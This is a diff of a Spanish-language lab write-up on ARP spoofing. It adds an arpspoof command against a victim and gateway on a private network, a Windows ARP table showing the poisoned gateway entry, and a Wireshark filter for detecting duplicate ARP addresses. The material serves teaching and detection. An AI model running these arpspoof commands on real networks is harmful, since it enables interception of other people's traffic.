@@ -117,6 +117,28 @@ DST/MASK       DEV     METRIC GATEWAY
 ::1/128        lo      0
 ::1/128        lo      256
 sudo arpspoof -i [interfazAtancante] -t [ipVíctima] [ipPuertaEnlace]
-sudo arpspoof -i enp0s3 -t 10.10.10.5 10.10.10.1
+sudo arpspoof -i enp0s3 -t 10.10.10.15 10.10.10.1
 ```
-![](capturas/arp-spoof-attack.png)
+![](capturas/arp-spoof.png)
+
+
+Volvemos a mostar la tabla arp que contiene la máquina windows y observamos que ya se ha ejecutado el ataque:
+```
+C:\Windows\system32>arp -a
+Interfaz: 10.0.2.15 --- 0x4
+  Dirección de Internet          Dirección física      Tipo
+  10.0.2.1              08-00-27-ab-bd-f3     dinámico
+  10.0.2.3              08-00-27-3d-9b-e2     dinámico
+  10.0.2.4              08-00-27-ab-bd-f3     dinámico
+  10.0.2.255            ff-ff-ff-ff-ff-ff     estático
+  224.0.0.22            01-00-5e-00-00-16     estático
+  224.0.0.251           01-00-5e-00-00-fb     estático
+  224.0.0.252           01-00-5e-00-00-fc     estático
+  239.255.255.250       01-00-5e-7f-ff-fa     estático
+  255.255.255.255       ff-ff-ff-ff-ff-ff     estático
+```
+
+En el tŕafico que se ha capturado durante el ataque, realizamos un filtro para mostrar si existió un ataque ARP spoof:
+```
+arp.duplicate-address-detected
+```
